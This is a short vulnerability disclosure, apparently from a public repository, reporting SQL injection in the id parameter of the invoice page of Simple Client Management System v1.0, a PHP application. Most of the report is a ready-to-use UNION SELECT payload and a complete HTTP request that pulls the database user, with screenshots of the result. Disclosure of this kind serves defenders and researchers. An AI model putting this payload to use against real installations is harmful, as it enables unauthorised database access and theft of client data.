# Simple-Client-Mnagement-System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15027/simple-client-management-system-php-source-code.html

Vulnerability File: /cms/admin/?page=invoice/manage_invoice&id= // Leak place ---> id

Vulnerability location: /cms/admin/?page=invoice/manage_invoice&id=, id

[+] Payload: /cms/admin/?page=invoice/manage_invoice&id=2%27%20union%20select%201,user(),3,4,5,6,7,8,9,10,11,12--+ // Leak place ---> id

```sql
GET /cms/admin/?page=invoice/manage_invoice&id=2%27%20union%20select%201,user(),3,4,5,6,7,8,9,10,11,12--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=3m0l1n81dvmlo0a3h9oo72q1gp
Connection: close
// Leak place ---> id
```

![image](https://user-images.githubusercontent.com/54017627/164882791-7e6ec922-2c33-4400-bcbb-16d3585c07ce.png)

![image](https://user-images.githubusercontent.com/54017627/164882796-7e5b7866-92fb-47a6-906b-6ed605489343.png)


